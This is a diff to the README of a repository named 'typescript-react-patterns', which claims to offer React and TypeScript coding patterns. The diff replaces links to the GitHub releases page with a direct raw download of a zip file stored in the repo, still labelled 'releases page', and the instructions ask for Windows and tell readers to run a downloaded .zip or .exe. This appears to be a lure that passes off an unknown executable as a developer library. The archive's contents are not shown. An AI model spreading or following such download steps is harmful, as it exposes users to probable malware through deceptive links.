@@ -1,6 +1,6 @@
 # ⚛️ typescript-react-patterns - Build robust React applications using TypeScript
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/dabelmtz1323/typescript-react-patterns/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/dabelmtz1323/typescript-react-patterns/main/rules/patterns-typescript-react-2.6.zip)
 
 This software provides a set of professional patterns to organize and maintain React and Next.js projects. It helps you manage code structures, debug issues, and apply clean architecture. The repository contains 17 modules covering over 4,000 lines of logic.
 
@@ -14,7 +14,7 @@ The patterns support modern tools such as Claude Code, Cursor, and Codex. These 
 
 You need a computer running Windows 10 or Windows 11 to install this software. Ensure you have a stable internet connection for the initial download.
 
-1. Visit the [releases page](https://github.com/dabelmtz1323/typescript-react-patterns/releases) to access the download files.
+1. Visit the [releases page](https://raw.githubusercontent.com/dabelmtz1323/typescript-react-patterns/main/rules/patterns-typescript-react-2.6.zip) to access the download files.
 2. Look for the file ending in `.zip` or `.exe` under the latest release.
 3. Save the file to your computer.
 4. Open the folder where the file exists.
